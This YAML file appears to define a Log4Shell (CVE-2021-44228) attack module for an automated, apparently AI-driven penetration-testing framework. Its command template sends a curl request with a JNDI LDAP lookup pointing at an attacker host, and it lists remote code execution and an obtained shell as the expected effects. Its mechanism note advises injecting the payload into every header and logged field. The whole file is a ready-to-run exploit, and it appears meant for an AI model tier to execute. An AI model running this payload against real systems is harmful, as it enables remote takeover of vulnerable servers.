name: log4shell
category: services
description: Log4Shell exploitation (CVE-2021-44228)
preconditions:
- service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: 'curl -s ''{target_url}'' -H ''X-Api-Version: ${{jndi:ldap://{attacker_ip}:1389/exploit}}'''
parser: web_response_parser
expected_effects:
- rce_achieved
- shell_obtained
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: "Log4j JNDI injection: ${jndi:ldap://attacker/a} triggers LDAP lookup \u2192\
  \ Java deserialization RCE. Test in all headers, parameters, user-agent. Inject\
  \ in any logged field."
hacktricks_ref: pentesting-web/deserialization/README.md
